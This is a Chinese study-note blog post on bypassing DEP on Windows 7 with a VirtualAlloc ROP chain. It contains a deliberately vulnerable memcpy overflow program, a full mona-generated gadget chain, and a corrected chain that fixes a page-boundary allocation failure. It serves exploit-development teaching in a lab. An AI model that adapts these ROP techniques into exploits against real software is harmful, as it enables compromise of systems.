---
layout: post
title: Windows Shellcode学习笔记——利用VirtualAlloc绕过DEP
---

## 0x00 前言
---

接着介绍DEP绕过的另一种方法——利用VirtualAlloc绕过DEP。通过VirtualAlloc函数可以申请一段具有可执行属性的内存，相比于VirtualProtect，传入VirtualAlloc的四个参数不需要先读取再赋值，可在shellcode中直接指定，结构更简单。当然，利用Immunity Debugger的mona插件可自动构造利用VirtualAlloc绕过DEP的ROP链。

## 0x01 简介
---

本文将要介绍以下内容：

- 调用VirtualAlloc函数时的Bug及修复

- 选择合适的替代指令，修改mona自动生成的rop链，实现利用

- 利用VirtualAlloc绕过DEP时需要考虑的细节，如对shellcode的长度要求

## 0x02 相关概念
---

**VirtualAlloc:**

LPVOID WINAPI VirtualAlloc(
LPVOID  lpAddress,
SIZE_T  dwSize,
DWORD flAllocationType,
DWORD flProtect
)

lpAddress:申请内存区域的地址
dwSize:申请内存区域的大小
flAllocationType:申请内存的类型
flProtect:申请内存的访问控制类型

申请成功时函数返回申请内存的起始地址，申请失败时返回NULL

## 0x03 实际测试
---

**测试环境：**

- 测试系统： Win 7
- 编译器：  VS2012
- build版本：  Release

**项目属性：**

- 关闭GS
- 关闭优化
- 关闭SEH
- 打开DEP
- 关闭ASLR
- 禁用c++异常
- 禁用内部函数

**注：**

详细配置方法在上篇文章有说明

同样是测试memcpy的缓冲器溢出，测试POC如下：

```
unsigned int shellcode[]=
{     
      0x90909090,0x90909090,0x90909090,0x90909090,
      0x90909090,0x90909090,0x90909090,0x90909090,
    0x90909090,0x90909090,0x90909090,0x90909090,
    0x90909090,
      0x41414141,  
      0x41414141
};
void test()
{
  char buffer[48];  
  printf("3\n");
  memcpy(buffer,shellcode,sizeof(shellcode));
}
int main()
{
  printf("1\n");
  test();
  return 0;
}
```

编译成exe，使用Immunity Debugger打开

使用mona插件自动生成rop链，输入：

`!mona rop -m *.dll -cp nonull`

查看rop_chains.txt，会列出可用来关闭DEP的ROP链

选择VirtualAlloc函数，详情如下：

```
Register setup for VirtualAlloc() :
--------------------------------------------
 EAX = NOP (0x90909090)
 ECX = flProtect (0x40)
 EDX = flAllocationType (0x1000)
 EBX = dwSize
 ESP = lpAddress (automatic)
 EBP = ReturnTo (ptr to jmp esp)
 ESI = ptr to VirtualAlloc()
 EDI = ROP NOP (RETN)
 --- alternative chain ---
 EAX = ptr to &VirtualAlloc()
 ECX = flProtect (0x40)
 EDX = flAllocationType (0x1000)
 EBX = dwSize
 ESP = lpAddress (automatic)
 EBP = POP (skip 4 bytes)
 ESI = ptr to JMP [EAX]
 EDI = ROP NOP (RETN)
 + place ptr to "jmp esp" on stack, below PUSHAD
--------------------------------------------

ROP Chain for VirtualAlloc() [(XP/2003 Server and up)] :
--------------------------------------------------------
*** [ C ] ***

  #define CREATE_ROP_CHAIN(name, ...) \
    int name##_length = create_rop_chain(NULL, ##__VA_ARGS__); \
    unsigned int name[name##_length / sizeof(unsigned int)]; \
    create_rop_chain(name, ##__VA_ARGS__);

  int create_rop_chain(unsigned int *buf, unsigned int )
  {
    // rop chain generated with mona.py - www.corelan.be
    unsigned int rop_gadgets[] = {
      0x693a2e92,  // POP ECX // RETN [MSVCR110.dll] 
      0x693bd19c,  // ptr to &VirtualAlloc() [IAT MSVCR110.dll]
      0x69353486,  // MOV EAX,DWORD PTR DS:[ECX] // RETN [MSVCR110.dll] 
      0x779f9dca,  // XCHG EAX,ESI // RETN [ntdll.dll] 
      0x69370742,  // POP EBP // RETN [MSVCR110.dll] 
      0x75dac58d,  // & call esp [KERNELBASE.dll]
      0x6932ea52,  // POP EAX // RETN [MSVCR110.dll] 
      0xffffffff,  // Value to negate, will become 0x00000001
      0x69353746,  // NEG EAX // RETN [MSVCR110.dll] 
      0x75da655d,  // XCHG EAX,EBX // ADD BH,CH // DEC ECX // RETN 0x10 [KERNELBASE.dll] 
      0x77216829,  // POP EAX // RETN [kernel32.dll] 
      0x41414141,  // Filler (RETN offset compensation)
      0x41414141,  // Filler (RETN offset compensation)
      0x41414141,  // Filler (RETN offset compensation)
      0x41414141,  // Filler (RETN offset compensation)
      0xa2800fc0,  // put delta into eax (-> put 0x00001000 into edx)
      0x7721502a,  // ADD EAX,5D800040 // RETN 0x04 [kernel32.dll] 
      0x771abd3a,  // XCHG EAX,EDX // RETN [kernel32.dll] 
      0x41414141,  // Filler (RETN offset compensation)
      0x69329bb1,  // POP EAX // RETN [MSVCR110.dll] 
      0xffffffc0,  // Value to negate, will become 0x00000040
      0x69354484,  // NEG EAX // RETN [MSVCR110.dll] 
      0x771d0946,  // XCHG EAX,ECX // RETN [kernel32.dll] 
      0x6935e68f,  // POP EDI // RETN [MSVCR110.dll] 
      0x69354486,  // RETN (ROP NOP) [MSVCR110.dll]
      0x693a7031,  // POP EAX // RETN [MSVCR110.dll] 
      0x90909090,  // nop
      0x69390267,  // PUSHAD // RETN [MSVCR110.dll] 
    };
    if(buf != NULL) {
      memcpy(buf, rop_gadgets, sizeof(rop_gadgets));
    };
    return sizeof(rop_gadgets);
  }

  // use the 'rop_chain' variable after this call, it's just an unsigned int[]
  CREATE_ROP_CHAIN(rop_chain, );
  // alternatively just allocate a large enough buffer and get the rop chain, i.e.:
  // unsigned int rop_chain[256];
  // int rop_chain_length = create_rop_chain(rop_chain, );
```

### 测试1：

填入上述ROP链，接着加上测试的命令：

```
PUSH 1;
POP ECX;
```

对应机器码为0x9059016A

组合后的POC如下：

```
unsigned int shellcode[]=
{     
      0x90909090,0x90909090,0x90909090,0x90909090,
      0x90909090,0x90909090,0x90909090,0x90909090,
    0x90909090,0x90909090,0x90909090,0x90909090,
    0x90909090,
      0x693a2e92,  // POP ECX // RETN [MSVCR110.dll] 
      0x693bd19c,  // ptr to &VirtualAlloc() [IAT MSVCR110.dll]
      0x69353486,  // MOV EAX,DWORD PTR DS:[ECX] // RETN [MSVCR110.dll] 
      0x779f9dca,  // XCHG EAX,ESI // RETN [ntdll.dll] 
      0x69370742,  // POP EBP // RETN [MSVCR110.dll] 
      0x75dac58d,  // & call esp [KERNELBASE.dll]
      0x6932ea52,  // POP EAX // RETN [MSVCR110.dll] 
      0xffffffff,  // Value to negate, will become 0x00000001
      0x69353746,  // NEG EAX // RETN [MSVCR110.dll] 
      0x75da655d,  // XCHG EAX,EBX // ADD BH,CH // DEC ECX // RETN 0x10 [KERNELBASE.dll] 
      0x77216829,  // POP EAX // RETN [kernel32.dll] 
      0x41414141,  // Filler (RETN offset compensation)
      0x41414141,  // Filler (RETN offset compensation)
      0x41414141,  // Filler (RETN offset compensation)
      0x41414141,  // Filler (RETN offset compensation)
      0xa2800fc0,  // put delta into eax (-> put 0x00001000 into edx)
      0x7721502a,  // ADD EAX,5D800040 // RETN 0x04 [kernel32.dll] 
      0x771abd3a,  // XCHG EAX,EDX // RETN [kernel32.dll] 
      0x41414141,  // Filler (RETN offset compensation)
      0x69329bb1,  // POP EAX // RETN [MSVCR110.dll] 
      0xffffffc0,  // Value to negate, will become 0x00000040
      0x69354484,  // NEG EAX // RETN [MSVCR110.dll] 
      0x771d0946,  // XCHG EAX,ECX // RETN [kernel32.dll] 
      0x6935e68f,  // POP EDI // RETN [MSVCR110.dll] 
      0x69354486,  // RETN (ROP NOP) [MSVCR110.dll]
      0x693a7031,  // POP EAX // RETN [MSVCR110.dll] 
      0x90909090,  // nop
      0x69390267,  // PUSHAD // RETN [MSVCR110.dll] 
      
      0x9059016A,  //PUSH 1  // POP ECX 
      0x90909090,
      0x90909090,
      0x90909090,
      0x90909090
};
void test()
{
  char buffer[48];  
  printf("3\n");
  memcpy(buffer,shellcode,sizeof(shellcode));
}
int main()
{
  printf("1\n");
  test();
  char Buf[] = 
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";
  return 0;
}
```

使用OllyDbg打开，单步跟踪到VirtualAllocEx()函数入口点

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-3-17/2-1.png)

如图，查看传入的函数参数

申请内存区域的起始地址为0x0012FF38
申请内存区域的大小为0x0000D101,换算成十进制为53505
申请内存的类型为0x00001000
申请内存的访问控制类型为0x00000040，即PAGE_EXECUTE_READWRITE

按F8单步跟踪，如图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-3-17/2-2.png)

返回值EAX为0,表示生成失败

查找原因，根据之前的经验，猜测是申请内存区域过长导致

### 测试2：

尝试修改内存大小

申请内存区域的起始地址为0x0012FF38，距离当前内存页结束还有200字节(0x00130000-0x0012FF38)

猜测修改的内存长度小于等于200才能满足条件

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-3-17/2-3.png)

如上图，将内存长度设置为200(0x000000C8)

按F8单步跟踪，如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-3-17/2-4.png)

申请成功，函数返回申请内存的起始地址

特别注意的是此处为当前内存页的起始地址：0x0012F000（而不是传入的内存起始地址0x0012FF38）

### 测试3：

再次测试，将长度设置为201，分配内存失败

根据以上测试结果，猜测：VirtualAllocEx()函数无法跨内存页申请内存

### 测试4：

继续测试， 将长度设置为1，函数返回当前内存页的起始地址：0x0012F000，并且shellcode成功执行

说明传入的函数长度对分配内存没有影响，但是加上申请内存的起始地址后必须小于当前内存页的长度

也就是说，在溢出过程中，通过VirtualAllocEx()函数申请的内存大小为固定值

现在，我们通过手动修改栈地址实现了DEP的绕过，下面将寻找合适的替换指令，构建自己的ROP链，解决mona自动生成产生的BUG

PUSHAD表示将所有寄存器的值入栈，入栈顺序为EAX,ECX,EDX,EBX,ESP,EBP,ESI,EDI

跟踪到PUSHAD，如图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-3-17/2-5.png)

EBX存储内存的长度，需要将EBX修改为小于201的值

## 0x04 查找替代指令，构造ROP链
---

在rop.txt中寻找合适的替代指令

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-3-17/2-6.png)

如上图，搜索关键词EBX,找到一条合适的替代指令：

`0x771c80a2 :  # XOR EAX,EAX # POP EBX # RETN    ** [kernel32.dll] **   |   {PAGE_EXECUTE_READ}`

`XOR EAX,EAX` 会将寄存器EAX的值清零
`POP EBX` 会从栈顶取值并赋值给EBX

选择合适的位置，并为EBX赋值,需要注意：

该指令将寄存器EAX的值清零，所以需要找到与EAX寄存器值无关的位置

POP EBX会读取下一条指令的内容，并赋值给EBX，所以后面接上EBX的值就好，例如0x00000028, // Set EBX=0x00000028(40)

找到一个合适的位置，放在` 0x693a7031,  // POP EAX // RETN [MSVCR110.dll]` 前面

完整shellcode如下：

```
unsigned int shellcode[]=
{     
      0x90909090,0x90909090,0x90909090,0x90909090,
      0x90909090,0x90909090,0x90909090,0x90909090,
    0x90909090,0x90909090,0x90909090,0x90909090,
    0x90909090,
      0x693a2e92,  // POP ECX // RETN [MSVCR110.dll] 
      0x693bd19c,  // ptr to &VirtualAlloc() [IAT MSVCR110.dll]
      0x69353486,  // MOV EAX,DWORD PTR DS:[ECX] // RETN [MSVCR110.dll] 
      0x779f9dca,  // XCHG EAX,ESI // RETN [ntdll.dll] 
      0x69370742,  // POP EBP // RETN [MSVCR110.dll] 
      0x75dac58d,  // & call esp [KERNELBASE.dll]
      0x6932ea52,  // POP EAX // RETN [MSVCR110.dll] 
      0xffffffff,  // Value to negate, will become 0x00000001
      0x69353746,  // NEG EAX // RETN [MSVCR110.dll] 
      0x75da655d,  // XCHG EAX,EBX // ADD BH,CH // DEC ECX // RETN 0x10 [KERNELBASE.dll] 
      0x77216829,  // POP EAX // RETN [kernel32.dll] 
      0x41414141,  // Filler (RETN offset compensation)
      0x41414141,  // Filler (RETN offset compensation)
      0x41414141,  // Filler (RETN offset compensation)
      0x41414141,  // Filler (RETN offset compensation)
      0xa2800fc0,  // put delta into eax (-> put 0x00001000 into edx)
      0x7721502a,  // ADD EAX,5D800040 // RETN 0x04 [kernel32.dll] 
      0x771abd3a,  // XCHG EAX,EDX // RETN [kernel32.dll] 
      0x41414141,  // Filler (RETN offset compensation)
      0x69329bb1,  // POP EAX // RETN [MSVCR110.dll] 
      0xffffffc0,  // Value to negate, will become 0x00000040
      0x69354484,  // NEG EAX // RETN [MSVCR110.dll] 
      0x771d0946,  // XCHG EAX,ECX // RETN [kernel32.dll] 
      0x6935e68f,  // POP EDI // RETN [MSVCR110.dll] 
      0x69354486,  // RETN (ROP NOP) [MSVCR110.dll]

    0x771c80a2, // # XOR EAX,EAX # POP EBX # RETN   [kernel32.dll]   |   {PAGE_EXECUTE_READ}
    0x00000028, // Set EBX=0x00000028(40)

    0x693a7031,  // POP EAX // RETN [MSVCR110.dll] 
      0x90909090,  // nop
      0x69390267,  // PUSHAD // RETN [MSVCR110.dll] 
      
      0x9059016A,  //PUSH 1  // POP ECX 
      0x90909090,
      0x90909090,
      0x90909090,
      0x90909090
};
```

重新编译，使用OllyDbg打开，单步跟踪到VirtualAllocEx()函数入口点

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-3-17/2-7.png)

如图，查看传入的函数参数

内存长度被修改为0x00000028(40)，其他传入参数正常

继续运行，进入`CALL ESP`，shellcode成功执行


## 0x05 小结
---

利用VirtualAlloc绕过DEP同利用VirtualProtect绕过DEP一样，都需要注意内存页长度的限制，无法跨页修改或者申请内存，这就对shellcode的长度提出了要求

当然，正常调用API实现VirtualProtect和VirtualAlloc不会存在跨内存页失败的问题

mona自动生成的rop链可作为参考模板，结合rop.txt下的替代指令，可构造更合适的ROP链


---


[LEAVE A REPLY](https://github.com/3gstudent/feedback/issues/new)

